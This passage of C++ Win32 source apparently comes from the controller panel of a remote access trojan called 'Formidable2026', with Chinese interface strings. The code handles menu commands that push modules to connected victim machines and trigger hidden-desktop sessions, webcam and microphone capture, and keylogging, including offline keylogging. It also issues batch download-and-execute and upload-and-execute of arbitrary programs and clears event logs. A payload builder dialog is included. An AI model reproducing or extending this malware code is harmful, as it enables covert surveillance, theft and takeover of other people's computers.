                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hFileDlg && IsWindow(client->hFileDlg)) {
                    ShowWindow(client->hFileDlg, SW_SHOW);
                    SetForegroundWindow(client->hFileDlg);
                } else {
                    client->hFileDlg = UI::FileDialog::Show(hWnd, clientId);
                    if (client->hFileDlg) ShowWindow(client->hFileDlg, SW_SHOW);
                    
                    AddLog(L"操作", L"打开文件管理...");
                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"FileManager.dll", CMD_DRIVE_LIST);
                }
            }
        }
        break;
    case IDM_DESKTOP:
    case IDM_CLIENT_DESKTOP_GRAYSCALE:
        {
            std::shared_ptr<Formidable::ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hDesktopDlg && IsWindow(client->hDesktopDlg)) {
                    ShowWindow(client->hDesktopDlg, SW_SHOW);
                    SetForegroundWindow(client->hDesktopDlg);
                } else {
                    bool isGrayscale = (id == IDM_CLIENT_DESKTOP_GRAYSCALE);
                    client->hDesktopDlg = UI::DesktopDialog::Show(hWnd, clientId, isGrayscale);
                    if (client->hDesktopDlg) ShowWindow(client->hDesktopDlg, SW_SHOW);
                    
                    AddLog(L"操作", isGrayscale ? L"打开远程桌面(灰度)..." : L"打开远程桌面...");
                }
            }
        }
        break;
    case IDM_VIDEO:
        {
            std::shared_ptr<Formidable::ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hVideoDlg && IsWindow(client->hVideoDlg)) {
                    ShowWindow(client->hVideoDlg, SW_SHOW);
                    SetForegroundWindow(client->hVideoDlg);
                } else {
                    client->hVideoDlg = CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_VIDEO), hWnd, UI::VideoDialog::DlgProc, (LPARAM)clientId);
                    ShowWindow(client->hVideoDlg, SW_SHOW);
                }
            }
        }
        break;
    case IDM_AUDIO:
        {
            std::shared_ptr<Formidable::ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hAudioDlg && IsWindow(client->hAudioDlg)) {
                    ShowWindow(client->hAudioDlg, SW_SHOW);
                    SetForegroundWindow(client->hAudioDlg);
                } else {
                    client->hAudioDlg = CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_AUDIO), hWnd, UI::AudioDialog::DlgProc, (LPARAM)clientId);
                    ShowWindow(client->hAudioDlg, SW_SHOW);
                }
            }
        }
        break;
    case IDM_REGISTRY:
        {
            std::shared_ptr<Formidable::ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hRegistryDlg && IsWindow(client->hRegistryDlg)) {
                    ShowWindow(client->hRegistryDlg, SW_SHOW);
                    SetForegroundWindow(client->hRegistryDlg);
                } else {
                    client->hRegistryDlg = UI::RegistryDialog::Show(hWnd, clientId);
                    if (client->hRegistryDlg) ShowWindow(client->hRegistryDlg, SW_SHOW);
                    
                    AddLog(L"操作", L"打开注册表...");
                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"RegistryManager.dll", CMD_REGISTRY_CTRL);
                }
            }
        }
        break;
    case IDM_SERVICE:
        {
            std::shared_ptr<Formidable::ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hServiceDlg && IsWindow(client->hServiceDlg)) {
                    ShowWindow(client->hServiceDlg, SW_SHOW);
                    SetForegroundWindow(client->hServiceDlg);
                } else {
                    extern INT_PTR CALLBACK ServiceDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
                    client->hServiceDlg = CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_SERVICE), hWnd, ServiceDlgProc, (LPARAM)clientId);
                    ShowWindow(client->hServiceDlg, SW_SHOW);
                    
                    AddLog(L"操作", L"打开服务管理...");
                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"ServiceManager.dll", CMD_SERVICE_LIST);
                }
            }
        }
        break;
    case IDM_BACKGROUND:
        {
            std::shared_ptr<Formidable::ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hBackgroundDlg && IsWindow(client->hBackgroundDlg)) {
                    ShowWindow(client->hBackgroundDlg, SW_SHOW);
                    SetForegroundWindow(client->hBackgroundDlg);
                } else {
                    client->hBackgroundDlg = UI::BackgroundDialog::Show(hWnd, clientId);
                    if (client->hBackgroundDlg) ShowWindow(client->hBackgroundDlg, SW_SHOW);
                    
                    AddLog(L"操作", L"打开后台桌面...");
                    // 启动模块
                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"BackgroundScreen.dll", CMD_BACKGROUND_CREATE);
                }
            }
        }
        break;
    case IDM_KEYLOGGER:
        {
            std::shared_ptr<Formidable::ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (client) {
                if (client->hKeylogDlg && IsWindow(client->hKeylogDlg)) {
                    ShowWindow(client->hKeylogDlg, SW_SHOW);
                    SetForegroundWindow(client->hKeylogDlg);
                } else {
                    extern INT_PTR CALLBACK KeylogDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
                    client->hKeylogDlg = CreateDialogParamW(g_hInstance, MAKEINTRESOURCEW(IDD_KEYLOGGER), hWnd, KeylogDlgProc, (LPARAM)clientId);
                    ShowWindow(client->hKeylogDlg, SW_SHOW);
                    
                    AddLog(L"操作", L"打开键盘记录...");
                    // 加载 Multimedia 模块并启动键盘记录
                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"Multimedia.dll", CMD_KEYLOG);
                }
            }
        }
        break;
    case IDM_SETTINGS:
        {
            extern INT_PTR CALLBACK SettingsDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
            DialogBoxW(g_hInstance, MAKEINTRESOURCEW(IDD_SETTINGS), hWnd, SettingsDlgProc);
        }
        break;
    case IDM_BUILDER:
        {
            extern INT_PTR CALLBACK BuilderDlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
            DialogBoxW(g_hInstance, MAKEINTRESOURCEW(IDD_BUILDER), hWnd, BuilderDlgProc);
        }
        break;
    case IDM_CLIENT_REMARK:
    case IDM_CLIENT_GROUP:
    case IDM_CLIENT_MESSAGE:
    case IDM_CLIENT_DOWNLOAD_EXEC:
    case IDM_CLIENT_UPLOAD_EXEC:
    case IDM_CLIENT_OPEN_URL:
    case IDM_CLIENT_SHUTDOWN:
    case IDM_CLIENT_REBOOT:
    case IDM_CLIENT_LOGOUT:
    case IDM_CLIENT_CLEAR_EVENT:
    case IDM_CLIENT_UPDATE:
    case IDM_CLIENT_UNINSTALL:
    case IDM_CLIENT_DISCONNECT:
    case IDM_CLIENT_REFRESH:
        {
            // 获取所有选中的客户端ID
            std::vector<uint32_t> selectedClients;
            int index = -1;
            while ((index = ListView_GetNextItem(g_hListClients, index, LVNI_SELECTED)) != -1) {
                LVITEMW lvi = { 0 };
                lvi.mask = LVIF_PARAM;
                lvi.iItem = index;
                if (ListView_GetItem(g_hListClients, &lvi)) {
                    selectedClients.push_back((uint32_t)lvi.lParam);
                }
            }
            
            if (selectedClients.empty() && id != IDM_CLIENT_REFRESH) {
                MessageBoxW(hWnd, L"请先选择客户端", L"提示", MB_OK | MB_ICONINFORMATION);
                break;
            }
            
            switch (id) {
            case IDM_CLIENT_REMARK: {
                // 设置备注 - 获取第一个选中客户端的当前备注
                std::wstring currentRemark;
                if (!selectedClients.empty()) {
                    std::lock_guard<std::mutex> lock(g_ClientsMutex);
                    if (g_Clients.count(selectedClients[0])) {
                        currentRemark = g_Clients[selectedClients[0]]->remark;
                    }
                }
                
                std::wstring newRemark = currentRemark;
                if (UI::InputDialog::Show(hWnd, L"设置备注", L"请输入备注信息:", newRemark)) {
                    std::lock_guard<std::mutex> lock(g_ClientsMutex);
                    for (auto cid : selectedClients) {
                        if (g_Clients.count(cid)) {
                            g_Clients[cid]->remark = newRemark;
                            
                            // 保存到持久化配置
                            std::wstring computerName = UTF8ToWide(g_Clients[cid]->info.computerName);
                            std::wstring userName = UTF8ToWide(g_Clients[cid]->info.userName);
                            std::wstring uniqueKey = computerName + L"_" + userName;
                            
                            {
                                std::lock_guard<std::mutex> lockRem(g_SavedRemarksMutex);
                                g_SavedRemarks[uniqueKey] = newRemark;
                            }
                            
                            // 更新历史记录中的备注
                            {
                                std::lock_guard<std::mutex> lockHist(g_HistoryHostsMutex);
                                if (g_HistoryHosts.count(uniqueKey)) {
                                    g_HistoryHosts[uniqueKey].remark = newRemark;
                                }
                            }

                            // 更新列表视图显示
                            int itemCount = ListView_GetItemCount(g_hListClients);
                            for (int i = 0; i < itemCount; i++) {
                                LVITEMW lvi = { 0 };
                                lvi.mask = LVIF_PARAM;
                                lvi.iItem = i;
                                if (ListView_GetItem(g_hListClients, &lvi) && lvi.lParam == cid) {
                                    ListView_SetItemText(g_hListClients, i, 12, (LPWSTR)newRemark.c_str());
                                    break;
                                }
                            }
                        }
                    }
                    // 统一保存到文件
                    SaveClientRemarks();
                    SaveHistoryHosts();
                    AddLog(L"系统", L"已更新 " + std::to_wstring(selectedClients.size()) + L" 个客户端的备注");
                }
                break;
            }
            case IDM_CLIENT_GROUP: {
                // 设置分组
                std::wstring groupName;
                if (UI::InputDialog::Show(hWnd, L"设置分组", L"请输入分组名称:", groupName)) {
                    if (!groupName.empty()) {
                        if (groupName.length() >= 24) {
                            MessageBoxW(hWnd, L"分组名称长度不得超过23个字符!", L"提示", MB_OK | MB_ICONWARNING);
                            break;
                        }
                        
                        std::string groupUtf8 = WideToUTF8(groupName);
                        
                        std::vector<uint32_t> updateClients;
                        {
                            std::lock_guard<std::mutex> lock(g_ClientsMutex);
                        for (auto cid : selectedClients) {
                            if (g_Clients.count(cid)) {
                                g_Clients[cid]->group = groupName;
                                updateClients.push_back(cid);
                            }
                        }
                        }
                        for (auto cid : updateClients) {
                            SendSimpleCommand(cid, CMD_SET_GROUP, 0, 0, groupUtf8);
                        }
                        
                        // 如果是新分组，添加到Tab
                        if (g_GroupList.find(groupUtf8) == g_GroupList.end()) {
                            g_GroupList.insert(groupUtf8);
                            TCITEMW item = { 0 };
                            item.mask = TCIF_TEXT;
                            item.pszText = (LPWSTR)groupName.c_str();
                            TabCtrl_InsertItem(g_hGroupTab, TabCtrl_GetItemCount(g_hGroupTab), &item);
                        }
                        
                        LoadListData(g_selectedGroup);
                        AddLog(L"系统", L"已将 " + std::to_wstring(selectedClients.size()) + L" 个客户端设置到分组: " + groupName);
                    }
                }
                break;
            }
            case IDM_CLIENT_MESSAGE: {
                // 发送消息
                std::wstring message;
                if (UI::InputDialog::Show(hWnd, L"发送消息", L"请输入要发送的消息:", message)) {
                    if (!message.empty()) {
                        std::string msgUtf8 = WideToUTF8(message);
                        for (auto cid : selectedClients) {
                            SendSimpleCommand(cid, CMD_MESSAGEBOX, 0, 0, msgUtf8);
                        }
                        AddLog(L"批量操作", L"已向 " + std::to_wstring(selectedClients.size()) + L" 个客户端发送消息");
                    }
                }
                break;
            }
            case IDM_CLIENT_DOWNLOAD_EXEC: {
                // 下载并执行
                std::wstring url;
                if (UI::InputDialog::Show(hWnd, L"下载执行", L"请输入下载地址 (http/https):", url)) {
                    if (!url.empty()) {
                        if (MessageBoxW(hWnd, L"确定要让选中的客户端下载并执行文件吗？", L"确认", MB_YESNO | MB_ICONQUESTION) == IDYES) {
                            std::string urlUtf8 = WideToUTF8(url);
                            for (auto cid : selectedClients) {
                                SendSimpleCommand(cid, CMD_DOWNLOAD_EXEC, 0, 0, urlUtf8);
                            }
                            AddLog(L"批量操作", L"已向 " + std::to_wstring(selectedClients.size()) + L" 个客户端发送下载执行命令");
                        }
                    }
                }
                break;
            }
            case IDM_CLIENT_UPLOAD_EXEC: {
                // 上传并执行
                OPENFILENAMEW ofn = { 0 };
                wchar_t szFile[MAX_PATH] = { 0 };
                ofn.lStructSize = sizeof(ofn);
                ofn.hwndOwner = hWnd;
                ofn.lpstrFile = szFile;
                ofn.nMaxFile = MAX_PATH;
                ofn.lpstrFilter = L"可执行文件\0*.exe;*.bat;*.cmd;*.ps1\0所有文件\0*.*\0";
                ofn.Flags = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST;
                
                if (GetOpenFileNameW(&ofn)) {
                    if (MessageBoxW(hWnd, L"确定要上传并执行选中的文件吗？", L"确认", MB_YESNO | MB_ICONQUESTION) == IDYES) {
                        std::ifstream file(szFile, std::ios::binary);
                        if (file.is_open()) {
                            file.seekg(0, std::ios::end);
                            size_t fileSize = (size_t)file.tellg();
                            file.seekg(0, std::ios::beg);
                            
                            std::wstring fileName = szFile;
                            size_t lastSlashPos = fileName.find_last_of(L"\\/");
                            if (lastSlashPos != std::wstring::npos) fileName = fileName.substr(lastSlashPos + 1);
                            
                            std::string utf8Name = WideToUTF8(fileName);
                            uint32_t nameLen = (uint32_t)utf8Name.size();
                            
                            std::vector<char> fileBuffer(4 + nameLen + fileSize);
                            *(uint32_t*)fileBuffer.data() = nameLen;
                            memcpy(fileBuffer.data() + 4, utf8Name.c_str(), nameLen);
                            file.read(fileBuffer.data() + 4 + nameLen, fileSize);
                            file.close();
                            
                            std::string fullPayload(fileBuffer.begin(), fileBuffer.end());
                            for (auto cid : selectedClients) {
                                SendSimpleCommand(cid, CMD_UPLOAD_EXEC, 0, 0, fullPayload);
                            }
                            AddLog(L"批量操作", L"已向 " + std::to_wstring(selectedClients.size()) + L" 个客户端发送上传执行命令: " + fileName);
                        } else {
                            MessageBoxW(hWnd, L"无法打开选中的文件!", L"错误", MB_OK | MB_ICONERROR);
                        }
                    }
                }
                break;
            }
            case IDM_CLIENT_OPEN_URL: {
                // 打开网址
                std::wstring url;
                if (UI::InputDialog::Show(hWnd, L"打开网址", L"请输入网址 (http/https):", url)) {
                    if (!url.empty()) {
                        std::string urlUtf8 = WideToUTF8(url);
                        for (auto cid : selectedClients) {
                            SendSimpleCommand(cid, CMD_OPEN_URL, 0, 0, urlUtf8);
                        }
                        AddLog(L"批量操作", L"已向 " + std::to_wstring(selectedClients.size()) + L" 个客户端发送打开网址命令");
                    }
                }
                break;
            }
            case IDM_CLIENT_SHUTDOWN: {
                if (MessageBoxW(hWnd, L"确定要关机选中的客户端吗？", L"确认", MB_YESNO | MB_ICONWARNING) == IDYES) {
                    for (auto cid : selectedClients) {
                        SendSimpleCommand(cid, CMD_POWER_SHUTDOWN);
                    }
                    AddLog(L"批量操作", L"已向 " + std::to_wstring(selectedClients.size()) + L" 个客户端发送关机命令");
                }
                break;
            }
            case IDM_CLIENT_REBOOT: {
                if (MessageBoxW(hWnd, L"确定要重启选中的客户端吗？", L"确认", MB_YESNO | MB_ICONWARNING) == IDYES) {
                    for (auto cid : selectedClients) {
                        SendSimpleCommand(cid, CMD_POWER_REBOOT);
                    }
                    AddLog(L"批量操作", L"已向 " + std::to_wstring(selectedClients.size()) + L" 个客户端发送重启命令");
                }
                break;
            }
            case IDM_CLIENT_LOGOUT: {
                if (MessageBoxW(hWnd, L"确定要注销选中的客户端吗？", L"确认", MB_YESNO | MB_ICONWARNING) == IDYES) {
                    for (auto cid : selectedClients) {
                        SendSimpleCommand(cid, CMD_POWER_LOGOUT);
                    }
                    AddLog(L"批量操作", L"已向 " + std::to_wstring(selectedClients.size()) + L" 个客户端发送注销命令");
                }
                break;
            }
            case IDM_CLIENT_CLEAR_EVENT: {
                if (MessageBoxW(hWnd, L"确定要清除选中客户端的事件日志吗？", L"确认", MB_YESNO | MB_ICONQUESTION) == IDYES) {
                    for (auto cid : selectedClients) {
                        SendSimpleCommand(cid, CMD_CLEAN_EVENT_LOG);
                    }
                    AddLog(L"批量操作", L"已向 " + std::to_wstring(selectedClients.size()) + L" 个客户端发送清除日志命令");
                }
                break;
            }
            case IDM_CLIENT_UNINSTALL: {
                if (MessageBoxW(hWnd, L"确定要卸载选中的客户端吗？此操作不可恢复！", L"警告", MB_YESNO | MB_ICONWARNING) == IDYES) {
                    for (auto cid : selectedClients) {
                        SendSimpleCommand(cid, CMD_UNINSTALL);
                    }
                    AddLog(L"批量操作", L"已向 " + std::to_wstring(selectedClients.size()) + L" 个客户端发送卸载命令");
                }
                break;
            }
            case IDM_CLIENT_DISCONNECT: {
                if (MessageBoxW(hWnd, L"确定要断开选中客户端的连接吗？", L"确认", MB_YESNO | MB_ICONQUESTION) == IDYES) {
                    std::lock_guard<std::mutex> lock(g_ClientsMutex);
                    for (auto cid : selectedClients) {
                        if (g_Clients.count(cid)) {
                            auto client = g_Clients[cid];
                            if (g_pNetworkServer && client->active) {
                                g_pNetworkServer->Disconnect(client->connId);
                            }
                        }
                    }
                    AddLog(L"批量操作", L"已断开 " + std::to_wstring(selectedClients.size()) + L" 个客户端");
                }
                break;
            }
            case IDM_CLIENT_REFRESH: {
                // 刷新列表 - 重新请求所有在线客户端的信息
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                for (auto& pair : g_Clients) {
                    SendSimpleCommand(pair.first, CMD_HEARTBEAT);
                }
                AddLog(L"系统", L"已刷新客户端列表");
                break;
            }
            }
        }
        break;
    case IDM_GROUP_RENAME: {
        // 重命名当前选中的分组
        if (g_selectedGroup == "默认" || g_selectedGroup == "default") {
            MessageBoxW(hWnd, L"默认分组无法重命名!", L"提示", MB_OK | MB_ICONINFORMATION);
            break;
        }
        
        std::wstring oldName = UTF8ToWide(g_selectedGroup);
        std::wstring newName = oldName;
        if (UI::InputDialog::Show(hWnd, L"重命名分组", L"请输入新的分组名称:", newName)) {
            if (newName.empty() || newName.length() >= 24) {
                MessageBoxW(hWnd, L"分组名称长度必须在1-23个字符之间!", L"提示", MB_OK | MB_ICONWARNING);
                break;
            }
            
            std::string newGroupUtf8 = WideToUTF8(newName);
            if (g_GroupList.find(newGroupUtf8) != g_GroupList.end()) {
                MessageBoxW(hWnd, L"分组名称已存在!", L"提示", MB_OK | MB_ICONWARNING);
                break;
            }
            
            // 更新所有属于该分组的客户端
            std::vector<uint32_t> updateClients;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                for (auto& pair : g_Clients) {
                    if (WideToUTF8(pair.second->group) == g_selectedGroup) {
                        pair.second->group = newName;
                        updateClients.push_back(pair.first);
                    }
                }
            }
            for (auto cid : updateClients) {
                SendSimpleCommand(cid, CMD_SET_GROUP, 0, 0, newGroupUtf8);
            }
            
            // 更新分组列表和Tab
            g_GroupList.erase(g_selectedGroup);
            g_GroupList.insert(newGroupUtf8);
            
            int nSel = TabCtrl_GetCurSel(g_hGroupTab);
            TCITEMW item = { 0 };
            item.mask = TCIF_TEXT;
            item.pszText = (LPWSTR)newName.c_str();
            TabCtrl_SetItem(g_hGroupTab, nSel, &item);
            
            g_selectedGroup = newGroupUtf8;
            LoadListData(g_selectedGroup);
        }
        break;
    }
    case IDM_GROUP_DELETE: {
        // 删除当前选中的分组
        if (g_selectedGroup == "默认" || g_selectedGroup == "default") {
            MessageBoxW(hWnd, L"默认分组无法删除!", L"提示", MB_OK | MB_ICONINFORMATION);
            break;
        }
        
        if (MessageBoxW(hWnd, L"确定要删除该分组吗？删除后该分组下的主机将移动到默认分组。", 
                       L"确认", MB_YESNO | MB_ICONQUESTION) != IDYES) {
            break;
        }
        
        // 将该分组下的所有客户端移到默认分组
        std::vector<uint32_t> updateClients;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            for (auto& pair : g_Clients) {
                if (WideToUTF8(pair.second->group) == g_selectedGroup) {
                    pair.second->group = L"";
                    updateClients.push_back(pair.first);
                }
            }
        }
        std::string emptyGroup;
        for (auto cid : updateClients) {
            SendSimpleCommand(cid, CMD_SET_GROUP, 0, 0, emptyGroup);
        }
        
        // 删除Tab
        int nSel = TabCtrl_GetCurSel(g_hGroupTab);
        TabCtrl_DeleteItem(g_hGroupTab, nSel);
        g_GroupList.erase(g_selectedGroup);
        
        // 切换到默认分组
        TabCtrl_SetCurSel(g_hGroupTab, 0);
        g_selectedGroup = "默认";
        LoadListData(g_selectedGroup);
        break;
    }
    // 主菜单项处理
    case IDM_MENU_SET:
        DialogBoxParamW(g_hInstance, MAKEINTRESOURCEW(IDD_SETTINGS), hWnd, SettingsDlgProc, 0);
        break;
    case IDM_TOOL_RELOAD_PLUGINS:
        AddLog(L"系统", L"已刷新插件列表");
        break;
    case IDM_PARAM_KBLOGGER: {
        // 切换键盘记录开关
        static bool kbLoggerEnabled = false;
        kbLoggerEnabled = !kbLoggerEnabled;
        
        // 更新菜单勾选状态
        HMENU hMenu = GetMenu(hWnd);
        HMENU hParamMenu = GetSubMenu(hMenu, 2); // 参数菜单
        CheckMenuItem(hParamMenu, IDM_PARAM_KBLOGGER, kbLoggerEnabled ? MF_CHECKED : MF_UNCHECKED);
        
        std::wstring status = kbLoggerEnabled ? L"已启用" : L"已禁用";
        AddLog(L"参数", L"键盘记录: " + status);
        
        // 向所有在线客户端发送设置
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        for (auto& pair : g_Clients) {
            if (pair.second->active) {
                // TODO: 实现全局设置数据包，包含键盘记录开关、上线提醒等
                // SendSimpleCommand(pair.first, CMD_SETTINGS, kbLoggerEnabled, 0);
            }
        }
        break;
    }
    case IDM_PARAM_OFFLINE_KEYLOG: {
        // 切换离线记录开关
        static bool offlineKeylogEnabled = true; // 默认启用
        offlineKeylogEnabled = !offlineKeylogEnabled;
        
        // 更新菜单勾选状态
        HMENU hMenu = GetMenu(hWnd);
        HMENU hParamMenu = GetSubMenu(hMenu, 2); // 参数菜单
        CheckMenuItem(hParamMenu, IDM_PARAM_OFFLINE_KEYLOG, offlineKeylogEnabled ? MF_CHECKED : MF_UNCHECKED);
        
        std::wstring status = offlineKeylogEnabled ? L"已启用" : L"已禁用";
        AddLog(L"参数", L"离线记录: " + status);
        
        // 向所有在线客户端发送设置
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        for (auto& pair : g_Clients) {
            if (pair.second->active) {
                SendSimpleCommand(pair.first, CMD_KEYLOG, 5, offlineKeylogEnabled ? 1 : 0);
            }
        }
        break;
    }
    case IDM_PARAM_LOGIN_NOTIFY: {
        // 切换上线提醒开关
        static bool loginNotifyEnabled = false;
        loginNotifyEnabled = !loginNotifyEnabled;
        
        // 更新菜单勾选状态
        HMENU hMenu = GetMenu(hWnd);
        HMENU hParamMenu = GetSubMenu(hMenu, 2); // 参数菜单
        CheckMenuItem(hParamMenu, IDM_PARAM_LOGIN_NOTIFY, loginNotifyEnabled ? MF_CHECKED : MF_UNCHECKED);
        
        std::wstring status = loginNotifyEnabled ? L"已启用" : L"已禁用";
        AddLog(L"参数", L"上线提醒: " + status);
        break;
    }
    case IDM_PARAM_ENABLE_LOG: {
        // 切换日志开关
        static bool logEnabled = false;
        logEnabled = !logEnabled;
        
        // 更新菜单勾选状态
        HMENU hMenu = GetMenu(hWnd);
        HMENU hParamMenu = GetSubMenu(hMenu, 2); // 参数菜单
        CheckMenuItem(hParamMenu, IDM_PARAM_ENABLE_LOG, logEnabled ? MF_CHECKED : MF_UNCHECKED);
        
        std::wstring status = logEnabled ? L"已启用" : L"已禁用";
        AddLog(L"参数", L"启用日志: " + status);
        
        // TODO: 发送设置到所有客户端
        // SendMasterSettings(nullptr);
        break;
    }
    case IDM_EXTEND_HISTORY: {
        Formidable::UI::HistoryDialog::Show(hWnd);
        break;
    }
    case IDM_EXTEND_BACKUP: {
        // 打开数据目录
        if (MessageBoxW(hWnd, 
            L"如果更换主控IP，必须将数据迁移到新的主控IP名下。\n"
            L"注意：更换主控程序的机器可能导致配置丢失！\n\n"
            L"是否打开数据目录？",
            L"备份数据", MB_YESNO | MB_ICONQUESTION) == IDYES) {
            
            wchar_t appDataPath[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
                std::wstring dataDir = std::wstring(appDataPath) + L"\\Formidable2026\\";
                CreateDirectoryW(dataDir.c_str(), NULL);
                ShellExecuteW(NULL, L"open", dataDir.c_str(), NULL, NULL, SW_SHOW);
            }
        }
        break;
    }
    case IDM_EXTEND_IMPORT: {
        // 导入配置文件
        if (MessageBoxW(hWnd,
            L"导入主控程序的配置和历史记录。\n"
            L"此操作会覆盖当前配置，请仅在迁移主控程序时操作。\n\n"
            L"是否继续？",
            L"导入数据", MB_YESNO | MB_ICONWARNING) != IDYES) {
            break;
        }
        
        OPENFILENAMEW ofn = { 0 };
        wchar_t szFile[MAX_PATH] = { 0 };
        ofn.lStructSize = sizeof(ofn);
        ofn.hwndOwner = hWnd;
        ofn.lpstrFile = szFile;
        ofn.nMaxFile = MAX_PATH;
        ofn.lpstrFilter = L"配置文件\0*.ini;*.cfg;*.conf\0所有文件\0*.*\0";
        ofn.lpstrTitle = L"选择要导入的配置文件";
        ofn.Flags = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST;
        
        if (GetOpenFileNameW(&ofn)) {
            // 备份当前配置
            wchar_t appDataPath[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
                std::wstring backupPath = std::wstring(appDataPath) + L"\\Formidable2026\\config.backup";
                CopyFileW(szFile, backupPath.c_str(), FALSE);
                AddLog(L"系统", L"配置文件已导入: " + std::wstring(szFile));
                MessageBoxW(hWnd, L"导入成功！请重启主控程序以应用新配置。", L"提示", MB_OK | MB_ICONINFORMATION);
            }
        }
        break;
    }
    default:
        break;
    }
}

// ---------------------------------------------------------
// WndProc - 主窗口过程
// ---------------------------------------------------------
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_CREATE: {
        // CreateMainMenu(hWnd); // 移除主菜单
        CreateMainToolbar(hWnd);
        
        g_hStatusBar = CreateStatusWindowW(WS_CHILD | WS_VISIBLE, L"", hWnd, IDC_STATUSBAR);
        
        // 状态栏分割
        int statusParts[] = { 200, 400, -1 }; // 在线 | 时间 | 端口
        SendMessageW(g_hStatusBar, SB_SETPARTS, 3, (LPARAM)statusParts);
        
        // 创建分组Tab控件
        g_hGroupTab = CreateWindowExW(0, WC_TABCONTROLW, L"",
            WS_CHILD | WS_VISIBLE | WS_CLIPSIBLINGS | TCS_TABS,
            0, 0, 0, 0, hWnd, (HMENU)IDC_GROUP_TAB, g_hInstance, NULL);
        
        // 初始化分组列表
        g_GroupList.insert("默认");
        g_selectedGroup = "默认";
        
        TCITEMW tie = { 0 };
        tie.mask = TCIF_TEXT;
        tie.pszText = (LPWSTR)L"默认";
        TabCtrl_InsertItem(g_hGroupTab, 0, &tie);
        
        g_hListClients = CreateWindowExW(0, WC_LISTVIEWW, L"", 
            WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SHOWSELALWAYS, 
            0, 0, 0, 0, hWnd, (HMENU)IDC_LIST_CLIENTS, g_hInstance, NULL);
        ListView_SetExtendedListViewStyle(g_hListClients, LVS_EX_FULLROWSELECT | LVS_EX_DOUBLEBUFFER);
        InitListView(g_hListClients);
        
        g_hListLogs = CreateWindowExW(0, WC_LISTVIEWW, L"", 
            WS_CHILD | WS_VISIBLE | LVS_REPORT, 
            0, 0, 0, 0, hWnd, (HMENU)IDC_LIST_LOGS, g_hInstance, NULL);
        SetWindowTheme(g_hListLogs, L"Explorer", NULL); // Win11 Style
        ListView_SetExtendedListViewStyle(g_hListLogs, LVS_EX_FULLROWSELECT | LVS_EX_DOUBLEBUFFER);
        
        LVCOLUMNW lvc = { 0 };
        lvc.mask = LVCF_TEXT | LVCF_WIDTH;
        lvc.pszText = (LPWSTR)L"类型"; lvc.cx = 100; SendMessageW(g_hListLogs, LVM_INSERTCOLUMNW, 0, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"时间";     lvc.cx = 100; SendMessageW(g_hListLogs, LVM_INSERTCOLUMNW, 1, (LPARAM)&lvc);
        lvc.pszText = (LPWSTR)L"内容"; lvc.cx = 800; SendMessageW(g_hListLogs, LVM_INSERTCOLUMNW, 2, (LPARAM)&lvc);

        // 设置字体
        NONCLIENTMETRICSW ncm = { sizeof(NONCLIENTMETRICSW) };
        if (SystemParametersInfoW(SPI_GETNONCLIENTMETRICS, sizeof(ncm), &ncm, 0)) {
            HFONT hFont = CreateFontIndirectW(&ncm.lfMessageFont);
            SendMessage(g_hListClients, WM_SETFONT, (WPARAM)hFont, TRUE);
            SendMessage(g_hListLogs, WM_SETFONT, (WPARAM)hFont, TRUE);
            SendMessage(g_hStatusBar, WM_SETFONT, (WPARAM)hFont, TRUE);
        }

        ApplyModernTheme(hWnd);
        
        SetTimer(hWnd, 1, 1000, NULL);
        UpdateStatusBar();
        
        break;
    }
    case WM_SIZE: {
        int width = LOWORD(lParam);
        int height = HIWORD(lParam);
        
        RECT rcToolbar, rcStatus;
        SendMessage(g_hToolbar, TB_AUTOSIZE, 0, 0);
        GetWindowRect(g_hToolbar, &rcToolbar);
        GetWindowRect(g_hStatusBar, &rcStatus);
        
        int toolbarHeight = rcToolbar.bottom - rcToolbar.top;
        int statusHeight = rcStatus.bottom - rcStatus.top;
        int tabHeight = 25;
